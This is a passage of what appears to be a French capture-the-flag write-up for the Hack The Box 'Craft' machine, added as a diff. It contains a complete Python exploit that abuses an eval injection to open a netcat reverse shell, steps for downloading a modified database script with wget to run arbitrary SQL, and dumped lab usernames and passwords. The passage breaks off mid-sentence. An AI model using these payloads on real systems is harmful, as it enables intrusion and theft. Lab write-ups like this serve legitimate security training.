@@ -174,3 +174,123 @@ et
 +print(response.text)
 ```
 Comme vous le remarquez des creds, comme ça au claire dans le code : ```auth=('dinesh', '4aUh0A8PbVJxgd'),```. Puis je me permettre la remarque un peu immature: on dirait le code de Vevo avant que Prosox et Kuroi'sh deface plusieurs Youtuber.
+Autre chose interessante la ligne ``` if eval('%s > 1' % request.json['abv'])```
+On a une petite injection ... Présent dans plusieurs box ;-). Donc maintenant on va pouvoir utiliser les credentials qu'on a trouvé pour récuperer un token afin d'envoyer une requete à /brew avec notre payload dans "abv" afin d'avoir un RCE.
+J'avais fait un exploit mais je l'ai effacé sans faire exprès, je me permet donc de reprendre celui de [0xrick](https://0xrick.github.io) que voila:
+```py#!/usr/bin/python3 
+import requests
+import json
+from subprocess import Popen
+from sys import argv
+from os import system
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+GREEN = "\033[32m"
+YELLOW = "\033[93m" 
+
+def get_token():
+	req = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
+	response = req.json()
+	token = response['token']
+	return token
+
+def exploit(token, ip, port):
+	tmp = {}
+
+	tmp['id'] = 0
+	tmp['name'] = "pwned"
+	tmp['brewer'] = "pwned"
+	tmp['style'] = "pwned"
+	tmp['abv'] = "__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f')".format(ip,port)
+
+	payload = json.dumps(tmp)
+
+	print(YELLOW + "[+] Starting listener on port {}".format(port))
+	Popen(["nc","-lvnp",port])
+
+	print(YELLOW + "[+] Sending payload")
+	requests.post('https://api.craft.htb/api/brew/', headers={'X-Craft-API-Token': token, 'Content-Type': 'application/json'}, data=payload, verify=False)
+
+if len(argv) != 3:
+	print(YELLOW + "[!] Usage: {} [IP] [PORT]".format(argv[0]))
+	exit()
+
+ip = argv[1]
+port = argv[2]
+print(YELLOW + "[+] Authenticating")
+token = get_token()
+print(GREEN + "[*] Token: {}".format(token))
+exploit(token, ip, port)
+```
+
+On ouvre un port, le 1337 car on est des hackers comme ceci:
+![image](crafthtb7.png)
+
+On passe aux choses obscure, on se trouve dans /opt/app et tout d'un coup un petit script s'y trouvant nous interesse ...
+```python
+/opt/app # ls -la
+total 44
+drwxr-xr-x    5 root     root          4096 Jan  3 17:28 .
+drwxr-xr-x    1 root     root          4096 Feb  9  2019 ..
+drwxr-xr-x    8 root     root          4096 Feb  8  2019 .git
+-rw-r--r--    1 root     root            18 Feb  7  2019 .gitignore
+-rw-r--r--    1 root     root          1585 Feb  7  2019 app.py
+drwxr-xr-x    5 root     root          4096 Feb  7  2019 craft_api
+-rwxr-xr-x    1 root     root           673 Feb  8  2019 dbtest.py
+drwxr-xr-x    2 root     root          4096 Feb  7  2019 tests
+/opt/app # cat dbtest.py
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                             user=settings.MYSQL_DATABASE_USER,
+                             password=settings.MYSQL_DATABASE_PASSWORD,
+                             db=settings.MYSQL_DATABASE_DB,
+                             cursorclass=pymysql.cursors.DictCursor)
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
+        cursor.execute(sql)
+        result = cursor.fetchone()
+        print(result)
+
+finally:
+    connection.close()
+/opt/app #
+```
+On a droit d'écrire dans ce répertoire j'ai donc récuperer le script et ajouter:
+```python
+import sys 
+```
+et j'ai changer la ligne:
+```python
+sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
+```
+en 
+```
+sql = sys.argv[1]
+```
+On ouvre un SimpleHTTPServer dans le dossier de notre script:
+```python -m SimpleHTTPServer 8080```
+et on execute sur la box
+```wget http://votre_ip:8080/scriptdb.py```
+cela n'a pas marché au debut j'ai remarqué le fetchone() et l'ai remplacé par fetchall : ```result = cursor.fetchall()```
+
+Maintenant amusons nous !
+```python scriptdb.py "SHOW TABLES"```
+resultat:
+```[{'Tables_in_craft': 'brew'}, {'Tables_in_craft': 'user'}]```
+Regardons du coté:
+```python scriptdb.py "SELECT * FROM user"```
+beaucoup trop simple ;) 
+```[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]```
+
+Mmmh qui est ce gilfuoyle ? Après un peu de recherche je test les mot de passe sur gogs et recupère ses commits:
+![image](crafthtb8.png)
+oh mais il n'a aucune idée de la sécurité: il a commit sa clé ssh ! On la récu
